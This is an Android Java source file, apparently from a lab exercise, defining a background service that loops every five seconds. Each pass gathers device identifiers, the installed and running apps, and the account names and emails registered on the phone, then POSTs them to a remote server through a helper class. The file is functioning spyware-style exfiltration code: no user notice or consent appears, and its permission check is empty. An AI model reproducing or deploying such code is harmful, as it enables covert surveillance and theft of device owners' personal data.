package com.example.lab2;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.app.ActivityManager;
import android.app.IntentService;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Environment;
import android.os.StatFs;
import android.util.Log;
import androidx.core.content.ContextCompat;
import java.io.File;
import java.io.IOException;
import java.text.DecimalFormat;
import java.util.List;

public class MyIntentService extends IntentService {

    private static Boolean isSrvcRun = false;

    public MyIntentService() {
        super("MyIntentService");
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        if(isSrvcRun==false){
            isSrvcRun = true;
            while(isSrvcRun) {
                this.sysinfo();
                try {
                    Thread.sleep(5000);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
        }
    }

    @Override
    public void onDestroy() {
        isSrvcRun = false;
        super.onDestroy();
    }
    private void sysinfo() {
        HttpURLConnectionExample connection = new HttpURLConnectionExample();
        String tmp = getAllContactsAccounts();
        Log.i("TAG", "SERIAL: " + Build.SERIAL);
        Log.i("TAG","MODEL: " + Build.MODEL);
        Log.i("TAG","ID: " + Build.ID);
        Log.i("TAG","Manufacture: " + Build.MANUFACTURER);
        Log.i("TAG","brand: " + Build.BRAND);
        Log.i("TAG","type: " + Build.TYPE);
        Log.i("TAG","user: " + Build.USER);
        Log.i("TAG","BASE: " + Build.VERSION_CODES.BASE);
        Log.i("TAG","INCREMENTAL " + Build.VERSION.INCREMENTAL);
        Log.i("TAG","SDK  " + Build.VERSION.SDK);
        Log.i("TAG","BOARD: " + Build.BOARD);
        Log.i("TAG","BRAND " + Build.BRAND);
        Log.i("TAG","HOST " + Build.HOST);
        Log.i("TAG","FINGERPRINT: "+Build.FINGERPRINT);
        Log.i("TAG","Version Code: " + Build.VERSION.RELEASE);
        Log.i("TAG","Memory: " + getFreeMemory(Environment.getDataDirectory()));
        Log.i("TAG","Installed apps: " + getInstalledApps());
        Log.i("TAG","Launched apps: " + getLaunchedApps());
        Log.i("TAG",tmp);
        char end = '\n';
        String POST_PARAMS = "SERIAL: " + Build.SERIAL + end + "MODEL: " +  Build.MODEL + end +
                "ID: " + Build.ID + end + "Manufacture: " + Build.MANUFACTURER + end +
                "brand: " + Build.BRAND + end + "type: " + Build.TYPE + end + "user: " + Build.USER + end +
                "BASE: " + Build.VERSION_CODES.BASE + end + "INCREMENTAL " + Build.VERSION.INCREMENTAL + end +
                "BOARD: " + Build.BOARD + end + "BRAND " + Build.BRAND + end + "HOST " + Build.HOST + end +
                "FINGERPRINT: " + Build.FINGERPRINT + end + "Version Code: " + Build.VERSION.RELEASE + end +
                "FREE_MEMORY: " + getFreeMemory(Environment.getDataDirectory()) + end +
                "INSTALLED APPS: " + getInstalledApps() + end + "Launched apps: " + getLaunchedApps() + end +
                tmp + end;
        try {
            connection.sendPOST(POST_PARAMS);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public String getAllContactsAccounts(){
        if (ContextCompat.checkSelfPermission(this,
                android.Manifest.permission.GET_ACCOUNTS)
                != PackageManager.PERMISSION_GRANTED) {
        }
        String possibleEmail="";
        possibleEmail += "************* Get Registered Gmail Account *************\n\n";
        Account[] accounts = AccountManager.get(this).getAccountsByType(null);
        Log.d("TAG", String.valueOf(accounts.length));
        Intent intent = AccountManager.newChooseAccountIntent(null, null, new String[]{"com.google"},
                true, null, null, null, null);
        for (Account account : accounts) {

            possibleEmail += " --> "+account.name+" : "+account.type+" , \n";
            possibleEmail += " \n\n";

        }


        Log.i("EXCEPTION", "Accounts: " + possibleEmail);
        return "mails: " + possibleEmail;
    }

    public String getLaunchedApps() {
        String list_of_launched_apps ="";
        ActivityManager active = (ActivityManager)
                this.getSystemService( ACTIVITY_SERVICE );
        List<ActivityManager.RunningAppProcessInfo> procInfos = active.getRunningAppProcesses();

        for(ActivityManager.RunningAppProcessInfo runningProInfo:procInfos){

            list_of_launched_apps += runningProInfo.processName;
            list_of_launched_apps += "; ";
        }
        return list_of_launched_apps;
    }

    public String getInstalledApps() {
        List<ApplicationInfo> list_of_apps = getPackageManager().getInstalledApplications(PackageManager.GET_META_DATA);
        StringBuilder string_of_names = new StringBuilder();
        for(ApplicationInfo E: list_of_apps) {
            string_of_names.append(E.packageName);
            string_of_names.append("; ");
        }
        return string_of_names.toString();
    }
    public String getFreeMemory(File path) {
        if ((null != path) && (path.exists()) && (path.isDirectory())) {
            StatFs stats = new StatFs(path.getAbsolutePath());
            return bytesToHuman(stats.getAvailableBlocksLong() * stats.getBlockSizeLong());
        }
        return "-1 B";
    }
    public String bytesToHuman(long totalBytes) {
        String[] simbols = new String[] {"B", "KiB", "MiB", "GiB", "TiB", "PiB", "EiB"};
        long scale = 1L;
        for (String simbol : simbols) {
            if (totalBytes < (scale * 1024L)) {
                return String.format("%s %s", new DecimalFormat("#.##").format((double)totalBytes / scale), simbol);
            }
            scale *= 1024L;
        }
        return "-1 B";
    }
}